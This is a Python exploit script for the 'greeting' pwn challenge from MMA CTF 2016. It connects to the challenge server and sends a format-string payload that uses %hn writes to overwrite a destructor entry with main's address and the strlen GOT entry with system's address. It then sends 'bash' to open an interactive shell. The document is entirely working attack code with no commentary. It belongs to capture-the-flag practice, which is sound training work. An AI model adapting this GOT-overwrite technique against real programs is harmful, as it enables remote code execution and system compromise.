# greeting 150 - mmactf2016
# https://ctftime.org/task/2735

from ChimPwn import *

c = ChimCalc(arch='x86')
p = ChimPwn(host='pwn2.chal.ctf.westerns.tokyo', port=16317, binary='greeting')
p.connect(meepwn='remote') #remote to server
#p.connect(meepwn='local') - create subprocess in local, sending/receiving msgs same as socket

p.recv_until("Please tell me your name... ")

add_dtor = 0x08049934
got_strlen = 0x08049A54
add_main = 0x080485ED
add_system = 0x08048490

pay = "xx"
pay += c.pack(add_dtor) + c.pack(got_strlen) + c.pack(got_strlen+2)

pay += "%1$" + str(c.fmt_minus(18 + len(pay), 0x0804, 2)) + "c" + "%14$hn"
pay += "%1$" + str(c.fmt_minus(0x0804, add_system & 0xffff, 2)) + "c" + "%13$hn"
pay += "%1$" + str(c.fmt_minus(add_system & 0xffff, add_main & 0xffff, 2)) + "c" + "%12$hn"

p.send(pay + "\n" + "bash\n")

p.interact()

p.close()